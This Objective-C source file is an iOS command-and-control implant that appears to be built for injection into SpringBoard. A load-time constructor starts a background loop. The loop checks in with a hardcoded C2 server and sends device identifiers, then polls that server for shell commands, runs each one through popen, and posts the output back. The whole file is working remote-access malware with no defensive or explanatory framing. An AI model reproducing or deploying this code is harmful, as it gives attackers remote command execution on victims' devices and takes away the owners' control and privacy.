@import Foundation;
#include <unistd.h>

#pragma mark - C2 Configuration

#define C2_HOST @"http://192.168.36.253:8888"
#define C2_POLL_INTERVAL 3.0

#pragma mark - C2 Agent

static NSString *c2_device_id(void) {
    NSString *f = @"/tmp/.c2_id";
    NSString *pid = [NSString stringWithContentsOfFile:f encoding:NSUTF8StringEncoding error:nil];
    if (pid) return pid;
    pid = [NSString stringWithFormat:@"sb_%@",
        [[[[UIDevice currentDevice] identifierForVendor] UUIDString] ?: @"unknown"]];
    [pid writeToFile:f atomically:YES encoding:NSUTF8StringEncoding error:nil];
    return pid;
}

static NSData *c2_get(NSString *path) {
    NSString *url = [C2_HOST stringByAppendingString:path];
    NSURLRequest *req = [NSURLRequest requestWithURL:[NSURL URLWithString:url]
        cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
    NSURLResponse *resp = nil; NSError *err = nil;
    return [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:&err];
}

static NSData *c2_post(NSString *path, NSDictionary *body) {
    NSString *url = [C2_HOST stringByAppendingString:path];
    NSError *e = nil;
    NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:&e];
    if (!json) return nil;
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]
        cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
    [req setHTTPMethod:@"POST"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [req setHTTPBody:json];
    NSURLResponse *resp = nil;
    return [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:&e];
}

static void c2_checkin(void) {
    NSString *ver = [[UIDevice currentDevice] systemVersion] ?: @"?";
    NSString *path = [NSString stringWithFormat:@"/api/checkin?id=%@&v=%@&proc=SpringBoard&pid=%d",
        c2_device_id(), ver, getpid()];
    c2_get(path);
}

static NSString *c2_execute(NSString *cmd) {
    @autoreleasepool {
        if (!cmd || cmd.length == 0) return @"";
        FILE *fp = popen([cmd UTF8String], "r");
        if (!fp) return @"popen failed";
        NSMutableString *out = [NSMutableString string];
        char buf[4096];
        size_t total = 0;
        while (fgets(buf, sizeof(buf), fp)) {
            total += strlen(buf);
            if (total > 1024 * 512) { break; }
            [out appendFormat:@"%s", buf];
        }
        int rc = pclose(fp);
        [out appendFormat:@"\n(exit: %d)", rc];
        return out;
    }
}

static void c2_poll_once(void) {
    @autoreleasepool {
        NSString *path = [NSString stringWithFormat:@"/api/commands?id=%@", c2_device_id()];
        NSData *data = c2_get(path);
        if (!data) return;
        NSError *e = nil;
        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&e];
        if (!json) return;
        for (NSDictionary *c in json[@"commands"]) {
            NSString *cid = c[@"id"];
            NSString *cmd = c[@"cmd"];
            if (!cmd) continue;
            NSString *output = c2_execute(cmd);
            c2_post(@"/api/result", @{@"id": c2_device_id(), @"cmd_id": cid ?: @"",
                                       @"output": output ?: @""});
        }
    }
}

static void c2_agent_loop(void) {
    @autoreleasepool {
        c2_checkin();
        NSString *pol = c2_execute(@"id");
        c2_post(@"/api/result", @{@"id": c2_device_id(), @"cmd_id": @"_proof_of_life",
                                   @"output": pol ?: @"no output"});
        while (1) {
            @autoreleasepool {
                c2_poll_once();
            }
            [NSThread sleepForTimeInterval:C2_POLL_INTERVAL];
        }
    }
}

static void c2_start(void) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        c2_agent_loop();
    });
}

#pragma mark - Constructor

__attribute__((constructor)) static void init_c2(void) {
    @try {
        [@"1" writeToFile:@"/tmp/.c2_loaded" atomically:YES encoding:NSUTF8StringEncoding error:nil];
        c2_start();
    } @catch (NSException *e) {
        [e.reason writeToFile:@"/tmp/.c2_crash" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}
